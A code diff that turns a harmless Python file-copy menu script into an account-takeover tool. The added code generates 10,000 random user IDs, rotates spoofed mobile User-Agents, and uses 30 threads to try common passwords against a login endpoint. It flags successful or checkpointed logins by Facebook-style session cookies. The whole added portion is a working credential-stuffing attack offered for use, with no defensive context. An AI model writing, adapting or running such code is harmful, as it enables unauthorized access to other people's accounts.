@@ -1,60 +1,49 @@
 import os
 import random
 import requests
+from concurrent.futures import ThreadPoolExecutor
 
-# Function to create a random clone
+# Random User-Agent list
+ugen = [
+    'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36'
+]
+
+# Random ID generator
 def random_clone():
-    print("Starting Random Clone...")
-    user_ids = []
-    for _ in range(10):  # Generates 10 random numbers (user IDs)
-        user_id = random.randint(1000000000, 9999999999)
-        user_ids.append(str(user_id))
+    users = []
+    for _ in range(10000):
+        uid = random.randint(1111111111, 9999999999)
+        users.append(str(uid))
     
-    print("Generated User IDs:")
-    print(user_ids)
+    print(f"{len(users)} random user IDs generated.")
+    return users
 
-# Function to clone content from one file to another
-def file_clone(source_file, destination_file):
-    if os.path.exists(source_file):
-        with open(source_file, 'r') as src:
-            content = src.read()
-        with open(destination_file, 'w') as dest:
-            dest.write(content)
-        print(f"Cloned content from {source_file} to {destination_file}")
-    else:
-        print(f"Source file '{source_file}' not found!")
-
-# Function to create a new file
-def create_file(file_name, content):
-    with open(file_name, 'w') as file:
-        file.write(content)
-    print(f"File '{file_name}' created with content.")
-
-# Main menu for the script
-def main():
-    while True:
-        print("\nChoose an option:")
-        print("1. Random Clone")
-        print("2. File Clone")
-        print("3. Create File")
-        print("4. Exit")
-        choice = input("Enter your choice: ")
-
-        if choice == "1":
-            random_clone()
-        elif choice == "2":
-            source_file = input("Enter the source file name: ")
-            destination_file = input("Enter the destination file name: ")
-            file_clone(source_file, destination_file)
-        elif choice == "3":
-            file_name = input("Enter the file name to create: ")
-            content = input("Enter content for the file: ")
-            create_file(file_name, content)
-        elif choice == "4":
-            print("Exiting...")
+# Clone user accounts
+def clone_user(uid, password_list):
+    session = requests.Session()
+    user_agent = random.choice(ugen)
+    headers = {'User-Agent': user_agent}
+    
+    for password in password_list:
+        data = {"email": uid, "pass": password}
+        response = session.post("https://example.com/login", data=data, headers=headers)
+        
+        if "c_user" in session.cookies:
+            print(f"[OK] {uid} | {password}")
             break
-        else:
-            print("Invalid choice, please try again.")
+        elif "checkpoint" in session.cookies:
+            print(f"[CP] {uid} | {password}")
+            break
+
+# Main function to execute cloning
+def main():
+    users = random_clone()
+    password_list = ["password123", "qwerty", "user2023"]
+    
+    with ThreadPoolExecutor(max_workers=30) as executor:
+        for uid in users:
+            executor.submit(clone_user, uid, password_list)
 
 if __name__ == "__main__":
     main()
